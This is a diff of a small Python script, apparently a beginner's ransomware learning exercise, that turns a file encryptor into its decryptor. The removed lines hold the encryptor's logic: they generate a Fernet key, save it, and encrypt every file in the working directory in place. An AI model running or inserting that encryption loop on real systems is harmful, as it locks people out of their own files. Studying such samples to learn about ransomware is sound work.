@@ -12,7 +12,6 @@ files = []
 for file in os.listdir():
     if file == "fake.malware.py" or file == "secretkey.key" or file == "fake_decrypt.py":
         continue
-
 #Here we will add the variable file to our "files" list above by appending
     if os.path.isfile(file):
         files.append(file)
@@ -20,22 +19,18 @@ for file in os.listdir():
 
 print (files)
 
-# Creating our encryption key
-key = Fernet.generate_key()
-
-# Saving our key to a file
-# we are using the function "thekey" to write to our variable "key" above. 
-with open("secretkey.key", "wb") as thekey:
-    thekey.write(key)
+# here we are opening the secret_key as key and defining a new variable "secret_key"
+with open("secretkey.key", "rb") as key:
+    secret_key = key.read()
 
 # This for loop will check every file in the variable files 
 # Then we are opening the files in read binary with our function "thefile" 
 # Then we are using the variable "contents" to be equal to thefile.read
-# Then we are opening the files and encrypting them with fernet
-# And then lastly we are writing back to the files with the encryption done above
+# Then we are opening the files and decrypting them with fernet and our secret_key variable above
+# And then lastly we are writing the decrypted contents back to the file 
 for file in files:
     with open(file, "rb") as thefile:
         contents = thefile.read()
-    contents_encrypted = Fernet(key).encrypt(contents)
+    contents_decrypted = Fernet(secret_key).decrypt(contents)
     with open(file, "wb") as thefile:
-        thefile.write(contents_encrypted)
+        thefile.write(contents_decrypted)
